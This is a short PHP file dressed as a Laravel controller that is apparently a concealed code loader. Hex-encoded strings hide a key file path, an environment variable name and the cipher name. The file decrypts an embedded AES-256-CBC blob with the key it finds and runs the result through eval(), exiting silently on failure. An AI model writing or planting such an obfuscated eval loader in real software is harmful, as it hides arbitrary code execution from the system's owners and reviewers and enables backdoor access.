<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Y21FUNUOPCCaeOHuenLpsw==');

$c=base64_decode(

'yZBmAP4RDZcY3WymcdIsA8TRoznMqb3zhCdMJ+hhJxdLvtDTu3TT/fH61r2spTBXHicMvYbBBsRi' .
'cR8wE0SgGRJGsPkd9Xd2GyLgtZHCekQPLI39s0A+U24Qw3qjXzu9FUMwPcBECjbCkZZ0CpfeMDk4' .
'Zdd/c6DOoh4gFGhOwF7Dpoqp1c6H616JA+ljfjn5XaZhDOuaSfqloaEpubvp0O9JfzD8bmuCigZD' .
'E/qqsPRqt0Mdf2bdNr1n5BJJIqFXW6mw6R7Wufn+Ag4jk8grvg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

